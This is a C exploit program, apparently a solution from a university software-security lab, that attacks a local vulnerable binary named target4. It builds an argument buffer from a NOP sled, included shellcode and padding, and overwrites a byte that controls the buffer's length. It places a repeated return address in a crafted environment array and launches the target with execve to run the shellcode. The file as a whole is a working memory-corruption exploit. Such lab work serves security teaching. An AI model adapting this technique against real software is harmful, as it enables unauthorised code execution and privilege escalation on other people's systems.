#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
  char *args[3];
  char *env[7];

  char temp1[170];
  char temp2[12];
  char tem[4] = "\xf0\xfd\x21\x20";
  int i;
  for (i=0;i<=169;i++){
    if (i<3) temp1[i]=0x90;
    else if (i<48) temp1[i]=shellcode[i-3];
    else if (i<168) temp1[i]=0x90;
    else if (i==168) temp1[i]=0x96; //150
    else if (i==169) temp1[i]=0x00;
  }

  for(i=0;i<12;i++){
		temp2[i]=tem[i%4];
	}

  args[0] = TARGET; args[1] = temp1; args[2] = NULL;
  env[0] = "\x00"; env[1] = "\x00"; env[2] = "\xa9\x00";
  env[3] = "\x00", env[4] = "\x00";
  env[5] = temp2;
  env[6] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
